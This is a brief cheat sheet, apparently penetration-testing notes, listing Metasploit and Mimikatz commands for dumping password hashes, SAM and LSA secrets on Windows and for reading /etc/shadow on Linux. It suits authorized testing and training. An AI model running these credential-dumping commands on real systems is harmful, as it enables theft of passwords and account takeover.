# Dumping Hashes

## Windows
- Mimikatz
```bash
msf> hashdump # builtin msf function 
msf> load kiwi # load mimitakz module
msf> lsa_dump_sam # dump the sam db
msf> lsa_dump_secrets # dump secrets
msf> creds_all # dump all
```

## Linux
```bash
msf> hashdump # builtin msf function 
msf> shell
cat /etc/shadow
```
